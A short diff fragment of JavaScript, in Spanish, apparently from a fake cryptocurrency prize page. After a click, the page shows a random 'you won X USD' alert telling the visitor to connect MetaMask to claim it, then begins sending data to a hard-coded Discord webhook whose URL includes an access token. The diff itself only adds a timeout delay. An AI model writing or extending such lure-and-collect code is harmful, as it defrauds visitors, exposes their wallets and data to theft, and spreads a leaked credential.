@@ -51,6 +51,8 @@ document.getElementById('enviar').addEventListener('click', function() {
     const prizeAlert = document.getElementById('prizeAlert');
     prizeAlert.textContent = `¡Felicidades! Has ganado ${randomValue} USD en ${randomCrypto.toUpperCase()} 🎉 Conecta con Metamask Para cobrar tu premio!`;
     prizeAlert.style.display = 'block';
+        }, 3000); // 3000 milisegundos = 3 segundos
+
 
     // Enviar datos al webhook de Discord
     const webhookUrl = 'https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-'; // Reemplazar con el URL de tu webhook de Discord
